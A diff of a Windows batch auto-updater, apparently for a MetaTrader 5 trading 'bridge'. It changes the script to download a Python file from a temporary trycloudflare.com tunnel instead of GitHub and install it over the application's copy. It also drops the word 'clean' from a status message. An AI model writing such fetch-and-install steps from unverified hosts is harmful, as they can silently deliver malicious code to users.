@@ -1,9 +1,9 @@
 @echo off
-title AMATERASU X - AUTO UPDATE BRIDGE SCRIPT & URL
+title AMATERASU X - AUTO UPDATE BRIDGE SCRIPT AND URL
 color 0A
 
-echo [1/2] Memuat turun fail Python Bridge terkini yang bersih...
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/forexhubglobal/omnisignal-app/main/amaterasu_mt5_bridge.py', '$env:TEMP\bridge.py')"
+echo [1/2] Memuat turun fail Python Bridge terkini...
+powershell -Command "irm https://equal-shield-amber-wilderness.trycloudflare.com/amaterasu_mt5_bridge.py -OutFile $env:TEMP\bridge.py"
 
 if exist "%TEMP%\bridge.py" (
     copy /y "%TEMP%\bridge.py" "C:\AmaterasuX\amaterasu_mt5_bridge.py" >nul
